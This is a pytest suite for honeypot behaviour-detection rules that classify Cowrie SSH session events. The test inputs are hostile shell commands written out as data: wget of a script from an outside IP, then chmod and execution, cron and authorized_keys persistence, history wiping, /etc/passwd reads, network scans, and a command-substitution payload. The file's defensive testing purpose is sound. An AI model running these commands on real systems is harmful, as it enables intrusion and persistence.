import glob
import json
import sqlite3

import pytest

from honeycomb.src.behavior import (
    build_behaviors, detect_behaviors, load_session_events,
)
from honeycomb.src.storage.loader import load_file


def ev(etype, **kw):
    return {"event_id": f"e{id(kw)}{etype}", "session_id": "s1", "event_type": etype, **kw}


def cmd(c):
    return ev("cowrie.command.input", command=c)


def fail(u="root", p="x"):
    return ev("cowrie.login.failed", username=u, password=p)


def ok(u="root", p="x9!"):
    return ev("cowrie.login.success", username=u, password=p)


def rules(events):
    return [h["rule_id"] for h in detect_behaviors(events, "s1")]


# ---- B01 / B02 / B03 -------------------------------------------------------
def test_b01_five_failed_logins_fires():
    assert "B01" in rules([fail() for _ in range(5)])


def test_b01_four_failed_logins_does_not_fire():
    assert "B01" not in rules([fail() for _ in range(4)])


def test_b02_default_pair_success_fires():
    assert "B02" in rules([ok("root", "root")])


def test_b02_ignores_failed_default_pair():
    assert "B02" not in rules([fail("admin", "admin"), ok("admin", "Passw0rd!")])


def test_b03_needs_b01_in_same_session():
    assert "B03" not in rules([fail(), ok()])
    assert "B03" in rules([fail() for _ in range(5)] + [ok()])


# ---- B04-B07 discovery -----------------------------------------------------
def test_b04_needs_two_commands():
    assert "B04" not in rules([cmd("whoami")])
    assert "B04" in rules([cmd("uname -a"), cmd("whoami")])


def test_b05_passwd_alone_is_enough():
    assert "B05" in rules([cmd("cat /etc/passwd")])


def test_b05_weak_commands_need_two():
    assert "B05" not in rules([cmd("w")])
    assert "B05" in rules([cmd("w"), cmd("last")])


def test_b06_network_discovery():
    assert "B06" in rules([cmd("ifconfig"), cmd("netstat -an")])


def test_b07_process_discovery():
    assert "B07" in rules([cmd("ps aux"), cmd("top")])


def test_two_commands_on_one_line_count_as_two():
    assert "B04" in rules([cmd("uname -a; whoami")])


# ---- B08 / B09 -------------------------------------------------------------
def test_b08_wget_command():
    assert "B08" in rules([cmd("wget http://198.51.100.9/x.sh")])


def test_b08_file_download_event_alone():
    e = ev("cowrie.session.file_download", url="http://198.51.100.9/x.sh")
    assert "B08" in rules([e])


def test_b09_chmod_then_run():
    assert "B09" in rules([cmd("chmod +x x.sh"), cmd("./x.sh")])
    assert "B09" in rules([cmd("chmod 777 bot.bin"), cmd("./bot.bin")])
    assert "B09" in rules([cmd("chmod +x a.sh"), cmd("sh a.sh")])


def test_b09_run_without_chmod_does_not_fire():
    assert "B09" not in rules([cmd("./x.sh")])


def test_b09_chmod_without_run_does_not_fire():
    assert "B09" not in rules([cmd("chmod +x x.sh")])


# ---- B10-B15 ---------------------------------------------------------------
@pytest.mark.parametrize("rule_id,command", [
    ("B10", "crontab -l"),
    ("B10", "echo '* * * * * /tmp/x' >> /etc/crontab"),
    ("B11", 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'),
    ("B12", "useradd hacker"),
    ("B12", "passwd root"),
    ("B13", "history -c"),
    ("B13", "rm -f ~/.bash_history"),
    ("B13", "unset HISTFILE"),
    ("B14", "pkill xmrig"),
    ("B14", "killall -9 minerd"),
    ("B15", "nmap -sS 10.0.0.0/24"),
    ("B15", "masscan 10.0.0.0/8 -p22"),
])
def test_single_command_rules(rule_id, command):
    assert rule_id in rules([cmd(command)])


def test_b14_needs_a_miner_name():
    assert "B14" not in rules([cmd("pkill firefox")])


# ---- every hit carries the evidence ----------------------------------------
def test_hit_has_evidence_and_technique():
    (h,) = detect_behaviors([cmd("history -c")], "s1")
    assert h["rule_id"] == "B13"
    assert h["technique_id"] == "T1070.003"
    assert h["evidence"] == "history -c"
    assert h["session_id"] == "s1"


def test_attacker_text_is_only_matched_not_executed():
    assert rules([cmd("echo $(touch /tmp/pwned)")]) == []


def test_empty_session_has_no_behaviors():
    assert detect_behaviors([], "s1") == []


# ---- the 6 labeled scenarios (docs/scenarios.md) ---------------------------
def _load_scenarios(tmp_path):
    db = str(tmp_path / "t.db")
    for f in sorted(glob.glob("tests/fixtures/scenarios/S*.jsonl")):
        load_file(db, f)
    return sqlite3.connect(db)


def test_scenarios_match_expected_json(tmp_path):
    expected = json.load(open("tests/fixtures/scenarios/expected.json"))
    conn = _load_scenarios(tmp_path)
    sessions = load_session_events(conn)
    for name, exp in expected.items():
        if name.startswith("_"):
            continue
        got = [h["rule_id"] for h in detect_behaviors(sessions[exp["session"]], exp["session"])]
        assert got == exp["behaviors"], name


def test_build_behaviors_twice_gives_same_rows(tmp_path):
    conn = _load_scenarios(tmp_path)
    n1 = build_behaviors(conn)
    rows1 = conn.execute("SELECT * FROM behaviors ORDER BY 1,2").fetchall()
    n2 = build_behaviors(conn)
    rows2 = conn.execute("SELECT * FROM behaviors ORDER BY 1,2").fetchall()
    assert n1 == n2 == len(rows1) and rows1 == rows2
